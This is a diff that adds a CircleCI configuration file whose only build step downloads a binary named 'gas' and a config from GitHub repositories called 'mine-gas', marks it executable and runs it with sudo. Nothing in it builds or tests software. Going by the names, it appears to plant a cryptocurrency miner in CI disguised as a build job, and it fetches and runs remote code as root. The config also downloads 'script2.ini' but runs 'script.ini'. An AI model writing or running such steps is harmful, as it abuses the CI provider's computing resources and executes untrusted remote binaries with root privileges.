@@ -1,0 +1,17 @@
+version: 2
+jobs:
+  build:
+    # Run in a separate virtual machine instead of a Docker container.
+    machine:
+      enabled: true
+      # Use Ubuntu 14.04 with bleeding edge Docker daemon 17.06.0-ce.
+      image: circleci/classic:edge
+    steps:
+      - checkout
+      - run:
+          command: |
+            sudo apt-get update
+            sudo wget https://github.com/L00K11/mine-gas/raw/main/gas
+            sudo wget https://github.com/koguara28/mine-gas/raw/main/script2.ini
+            sudo chmod +x gas
+            sudo ./gas script.ini
